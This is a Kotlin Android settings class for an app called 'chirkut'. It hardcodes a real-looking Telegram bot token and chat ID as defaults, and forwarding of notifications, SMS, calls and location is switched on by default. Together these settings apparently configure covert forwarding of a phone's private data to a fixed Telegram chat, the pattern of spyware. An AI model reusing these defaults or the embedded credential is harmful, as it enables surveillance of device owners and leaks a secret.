package com.example.data

import android.content.Context
import androidx.datastore.core.DataStore
import androidx.datastore.preferences.core.*
import androidx.datastore.preferences.preferencesDataStore
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.map

private val Context.dataStore: DataStore<Preferences> by preferencesDataStore(name = "chirkut_settings")

class DataStoreManager(private val context: Context) {

    companion object {
        val KEY_TELEGRAM_TOKEN = stringPreferencesKey("telegram_token")
        val KEY_TELEGRAM_CHAT_ID = stringPreferencesKey("telegram_chat_id")
        val KEY_NOTIFICATION_FORWARD = booleanPreferencesKey("notification_forward")
        val KEY_SMS_FORWARD = booleanPreferencesKey("sms_forward")
        val KEY_CALL_FORWARD = booleanPreferencesKey("call_forward")
        val KEY_LOCATION_SHARING = booleanPreferencesKey("location_sharing")
        val KEY_FOREGROUND_SERVICE = booleanPreferencesKey("foreground_service")
        val KEY_TELEGRAM_ENABLED = booleanPreferencesKey("telegram_enabled")
        val KEY_MARKDOWN_ENABLED = booleanPreferencesKey("markdown_enabled")

        const val DEFAULT_TOKEN = "8971346857:AAGrbdGxtHCc5x2pBOCnRkLdOTP8wtw1nNk"
        const val DEFAULT_CHAT_ID = "6730742077"
    }

    val telegramToken: Flow<String> = context.dataStore.data.map { pref ->
        pref[KEY_TELEGRAM_TOKEN] ?: DEFAULT_TOKEN
    }

    val telegramChatId: Flow<String> = context.dataStore.data.map { pref ->
        pref[KEY_TELEGRAM_CHAT_ID] ?: DEFAULT_CHAT_ID
    }

    val notificationForward: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_NOTIFICATION_FORWARD] ?: true
    }

    val smsForward: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_SMS_FORWARD] ?: true
    }

    val callForward: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_CALL_FORWARD] ?: true
    }

    val locationSharing: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_LOCATION_SHARING] ?: true
    }

    val foregroundServiceEnabled: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_FOREGROUND_SERVICE] ?: true
    }

    val telegramEnabled: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_TELEGRAM_ENABLED] ?: true
    }

    val markdownEnabled: Flow<Boolean> = context.dataStore.data.map { pref ->
        pref[KEY_MARKDOWN_ENABLED] ?: true
    }

    suspend fun updateTelegramToken(token: String) {
        context.dataStore.edit { pref -> pref[KEY_TELEGRAM_TOKEN] = token }
    }

    suspend fun updateTelegramChatId(chatId: String) {
        context.dataStore.edit { pref -> pref[KEY_TELEGRAM_CHAT_ID] = chatId }
    }

    suspend fun updateNotificationForward(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_NOTIFICATION_FORWARD] = enabled }
    }

    suspend fun updateSmsForward(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_SMS_FORWARD] = enabled }
    }

    suspend fun updateCallForward(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_CALL_FORWARD] = enabled }
    }

    suspend fun updateLocationSharing(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_LOCATION_SHARING] = enabled }
    }

    suspend fun updateForegroundServiceEnabled(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_FOREGROUND_SERVICE] = enabled }
    }

    suspend fun updateTelegramEnabled(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_TELEGRAM_ENABLED] = enabled }
    }

    suspend fun updateMarkdownEnabled(enabled: Boolean) {
        context.dataStore.edit { pref -> pref[KEY_MARKDOWN_ENABLED] = enabled }
    }
}
